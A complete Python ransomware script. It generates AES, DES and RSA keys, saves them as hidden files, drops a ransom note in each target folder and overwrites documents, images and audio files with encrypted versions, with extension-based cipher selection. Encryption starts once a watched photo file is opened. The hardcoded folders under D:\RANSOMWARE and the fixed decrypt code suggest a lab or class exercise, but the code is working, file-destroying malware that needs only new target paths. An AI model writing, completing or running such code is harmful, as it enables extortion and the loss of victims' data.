import os
import time
import ctypes
from Crypto.Cipher import AES, DES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

SOURCE_FOLDERS = [
    r"D:\RANSOMWARE\documenation",
    r"D:\RANSOMWARE\photos",
    r"D:\RANSOMWARE\songs"
]

TARGET_PHOTO = r"D:\test.jpg"  # The file to monitor

def save_hidden(filepath, data):
    with open(filepath, "wb") as f:
        f.write(data)
    if os.name == 'nt':
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(filepath, FILE_ATTRIBUTE_HIDDEN)

def create_ransom_readme():
    message = (
        "Your files have been encrypted!\n"
        "To decrypt your files, use the code: 2004\n"
    )
    for folder in SOURCE_FOLDERS:
        for root, dirs, files in os.walk(folder):
            readme_path = os.path.join(root, "Readme.txt")
            try:
                with open(readme_path, "w", encoding="utf-8") as f:
                    f.write(message)
            except Exception as e:
                print(f"Failed to create Readme.txt in {root}: {e}")

aes_key = get_random_bytes(16)
des_key = get_random_bytes(8)
rsa_key = RSA.generate(2048)
public_key = rsa_key.publickey()

KEYS_FOLDER = r"D:\Keys"
os.makedirs(KEYS_FOLDER, exist_ok=True)

save_hidden(os.path.join(KEYS_FOLDER, ".aes_key.sys"), aes_key)
save_hidden(os.path.join(KEYS_FOLDER, ".des_key.sys"), des_key)
save_hidden(os.path.join(KEYS_FOLDER, ".rsa_private.sys"), rsa_key.export_key())
save_hidden(os.path.join(KEYS_FOLDER, ".rsa_public.sys"), public_key.export_key())

def encrypt_aes(file_path, key):
    cipher = AES.new(key, AES.MODE_CBC)
    with open(file_path, 'rb') as f:
        data = f.read()
    ciphertext = cipher.iv + cipher.encrypt(pad(data, AES.block_size))
    return ciphertext

def encrypt_des(file_path, key):
    cipher = DES.new(key, DES.MODE_CBC)
    with open(file_path, 'rb') as f:
        data = f.read()
    ciphertext = cipher.iv + cipher.encrypt(pad(data, DES.block_size))
    return ciphertext

def encrypt_rsa_hybrid(file_path, pub_key):
    aes_key_local = get_random_bytes(16)
    iv = get_random_bytes(16)
    aes_cipher = AES.new(aes_key_local, AES.MODE_CBC, iv)
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = aes_cipher.encrypt(pad(data, AES.block_size))
    rsa_cipher = PKCS1_OAEP.new(RSA.import_key(pub_key))
    encrypted_key_iv = rsa_cipher.encrypt(aes_key_local + iv)
    return encrypted_key_iv + encrypted_data

def encrypt_all_files():
    print("Starting encryption of all supported files...")
    create_ransom_readme()
    for root_folder in SOURCE_FOLDERS:
        for root, dirs, files in os.walk(root_folder):
            for filename in files:
                if filename == "Readme.txt":
                    continue  # Skip ransom note
                src_path = os.path.join(root, filename)
                ext = filename.split('.')[-1].lower()
                try:
                    if ext in ['txt', 'csv', 'json', 'jpg', 'jpeg', 'png']:
                        encrypted = encrypt_aes(src_path, aes_key)
                    elif ext in ['mp3', 'wav']:
                        encrypted = encrypt_des(src_path, des_key)
                    elif ext in ['docx', 'pptx']:
                        encrypted = encrypt_rsa_hybrid(src_path, public_key.export_key())
                    else:
                        continue  # Unsupported file type
                    with open(src_path, 'wb') as f:
                        f.write(encrypted)
                    print(f"Encrypted: {src_path}")
                except Exception as e:
                    print(f"Error encrypting {src_path}: {e}")
    print("Encryption finished!")

last_access_time = None

def file_was_opened(filepath):
    global last_access_time
    try:
        current_atime = os.path.getatime(filepath)
    except Exception:
        return False
    if last_access_time is None:
        last_access_time = current_atime
        return False
    if current_atime != last_access_time:
        last_access_time = current_atime
        return True
    return False

def main():
    print(f"Monitoring access to: {TARGET_PHOTO}")
    while True:
        if file_was_opened(TARGET_PHOTO):
            print(f"{TARGET_PHOTO} was opened! Triggering encryption...")
            encrypt_all_files()
            print("Encryption done. Exiting monitor.")
            break
        time.sleep(2)  # wait 2 seconds before checking again

if __name__ == "__main__":
    main()
